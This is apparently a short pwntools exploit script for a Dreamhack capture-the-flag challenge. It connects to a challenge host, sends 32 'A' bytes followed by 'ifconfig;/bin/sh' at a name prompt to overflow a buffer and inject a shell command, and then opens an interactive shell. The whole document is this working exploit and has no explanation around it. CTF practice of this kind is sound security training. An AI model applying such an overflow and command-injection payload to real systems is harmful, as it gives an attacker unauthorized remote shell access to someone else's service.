from pwn import *

port = 19255
rem = remote("host3.dreamhack.games", port)

rem.sendlineafter(b'name: ', b'A' * 0x20 + b'ifconfig;/bin/sh')

rem.interactive()